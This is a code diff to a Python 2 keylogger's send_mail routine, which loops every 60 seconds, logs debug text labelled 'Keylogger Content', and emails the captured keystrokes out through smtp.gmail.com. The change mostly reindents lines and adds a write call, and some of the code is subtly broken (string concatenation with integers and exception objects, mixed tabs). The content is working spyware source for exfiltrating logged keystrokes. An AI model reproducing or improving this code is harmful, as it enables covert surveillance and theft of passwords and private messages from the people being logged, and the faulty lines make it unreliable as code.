@@ -37,13 +37,12 @@ def send_mail():
     global data
     while True:
         file_object = open(debugFile, "a+")
-		string_to_write = "===== SENDING EMAIL: DEBUG MODE =====\n";
-		string_to_write += "Data Content Length: " + len(data) + "\n"
-		string_to_write += "Keylogger Content: " + data + "\n"
-		string_to_write += "Keylogger Content: " + data + "\n"
-		string_to_write += "Email: " + EEMAIL + "\n"
-		string_to_write += "[*] SENDING EMAIL NOW" + "\n"
-		
+        string_to_write = "===== SENDING EMAIL: DEBUG MODE =====\n";
+        string_to_write += "Data Content Length: " + len(data) + "\n"
+        string_to_write += "Keylogger Content: " + data + "\n"
+        string_to_write += "Keylogger Content: " + data + "\n"
+        string_to_write += "Email: " + EEMAIL + "\n"
+        string_to_write += "[*] SENDING EMAIL NOW" + "\n"
         if len(data) > 0:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
@@ -69,10 +68,11 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
-				string_to_write += "[*] Data Sent!" + "\n"
+                string_to_write += "[*] Data Sent!" + "\n"
             except Exception as error:
                 print error
-				string_to_write += "[*] Error Encountered: " + error + "\n"
+                string_to_write += "[*] Error Encountered: " + error + "\n"
+		file_object.write(string_to_write)
         file_object.close()
         sleep(60)
 
